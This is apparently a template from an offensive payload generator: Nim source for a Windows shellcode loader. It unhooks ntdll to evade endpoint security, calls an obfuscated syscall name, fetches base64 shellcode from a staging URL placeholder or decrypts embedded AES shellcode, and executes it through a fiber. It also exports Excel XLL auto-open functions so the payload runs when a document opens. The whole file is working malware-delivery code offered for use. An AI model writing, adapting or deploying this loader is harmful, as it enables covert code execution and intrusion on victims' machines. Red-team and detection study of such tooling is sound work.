import winim
when defined unhook:
  import ptr_math
import std/strutils
when defined staged:
  import std/httpclient
  import std/strutils
  import std/base64

when defined encrypted:
  import nimcrypto
  #[ KEY_STR ]#
  #[ IV_STR ]#

include syscalls



proc NimMain() {.cdecl, importc.}

when defined unhook:
  proc toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

  proc ntdll_mapviewoffile() =
    let low: uint16 = 0
    var 
        processH = GetCurrentProcess()
        mi : MODULEINFO
        ntdllModule = GetModuleHandleA("ntdll.dll")
        ntdllBase : LPVOID
        ntdllFile : FileHandle
        ntdllMapping : HANDLE
        ntdllMappingAddress : LPVOID
        hookedDosHeader : PIMAGE_DOS_HEADER
        hookedNtHeader : PIMAGE_NT_HEADERS
        hookedSectionHeader : PIMAGE_SECTION_HEADER
  
    GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
    ntdllBase = mi.lpBaseOfDll
  
  
    ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
    ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
    
  
    if ntdllMapping == 0:
      return
    
  
    ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
    if ntdllMappingAddress.isNil:
      return
  
  
    hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
    hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
    for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
        hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if ".text" in toString(hookedSectionHeader.Name):
            var oldProtection : DWORD = 0
            var text_addr : LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
            var sectionSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
  
            var status = CoapyfCqWjDhcIOb(processH, addr text_addr, &sectionSize, PAGE_EXECUTE_READWRITE, addr oldProtection)
            copyMem(text_addr, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
            status = CoapyfCqWjDhcIOb(processH, addr text_addr, &sectionSize, oldProtection, addr oldProtection)
  
  
    CloseHandle(processH)
    CloseHandle(ntdllFile)
    CloseHandle(ntdllMapping)
    FreeLibrary(ntdllModule)
          


proc run() {.thread.} =
  when defined unhook:
    ntdll_mapviewoffile()
  when defined staged:
    var client = newHttpClient()
    var encodedShellcode =  client.getContent("%STAGINGURL%") # CHANGE THIS
    
  
    var shellcodeString: string
    for ch in encodedShellcode:
      if isAlphaNumeric(ch):
        shellcodeString.add(ch)
      elif ch == '_': # nim literally cannot decode urlsafe base64
        shellcodeString.add('/')
      elif ch == '-':
        shellcodeString.add('+')
    
    shellcodeString = shellcodeString[4 .. shellcodeString.len - 5]

    if len(shellcodeString) mod 4 > 0: # adjust for missing padding
      shellcodeString &= repeat('=', 4 - len(shellcodeString) mod 4)
    
    var shellcode = newseq[byte]()
    
    shellcodeString = decode(shellcodeString)
  
    for ch in shellcodeString:  
      shellcode.add(cast[byte](ch))
  elif defined encrypted:
    var dctx: CTR[aes128]
    #[ ENC_SC ]#
    var shellcode: array[aesdata.len, byte]

    dctx.init(aeskey, aesiv)
    dctx.decrypt(aesdata, shellcode)

  else:
    echo "%SHELLCODE_ARRAY%"
  
  var mainFiber = ConvertThreadToFiber(nil)

  echo toHex(cast[int64](mainFiber))
  var shellcodeLocation = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE);
  echo toHex(cast[int64](shellcodeLocation))
  
  CopyMemory(shellcodeLocation, &shellcode[0], shellcode.len);
  

  var shellcodeFiber = CreateFiber(cast[SIZE_T](0), cast[LPFIBER_START_ROUTINE](shellcodeLocation), NULL);
  echo toHex(cast[int64](shellcodeFiber))
  
  var oldprotect: ULONG
  VirtualProtect(shellcodeLocation, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READ, &oldprotect)
  
  
  SwitchToFiber(shellcodeFiber);




when defined excel:
  proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
    var t: Thread[void]
     
    t.createThread(run)    
    joinThread(t)
  proc xlAutoAdd(): int {.stdcall, exportc, dynlib.} =
    var t: Thread[void]
     
    t.createThread(run)    
    joinThread(t)
    return 1
  proc xlAutoRegister(pxloper_ptr: DWORD): DWORD {.stdcall, exportc, dynlib.} =
    var t: Thread[void]
     
    t.createThread(run)    
    joinThread(t)
    return 1

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  return true